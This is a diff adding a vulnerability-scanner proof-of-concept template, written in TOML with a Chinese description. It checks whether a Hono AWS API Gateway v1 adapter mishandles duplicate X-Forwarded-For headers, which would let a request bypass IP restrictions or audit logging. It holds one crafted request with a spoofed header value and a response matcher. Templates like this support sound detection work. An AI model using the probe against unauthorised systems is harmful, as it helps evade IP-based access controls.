@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "向 Hono 应用发送包含子串关系的重复 X-Forwarded-For 请求头，验证 AWS API Gateway v1 适配器是否错误丢弃非子串值，导致 IP 限制/审计日志绕过"
+id = "POC-AVE-2026-0862"
+name = "Hono AWS API Gateway v1 适配器重复请求头值去重绕过 PoC"
+severity = "medium"
+tags = ["ave-2026-0862"]
+vuln_id = [
+    "CVE-2026-59897",
+    "AVE-2026-0862",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+X-Forwarded-For = "203.0.113.1, 203.0.113.10"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["203.0.113.1"]
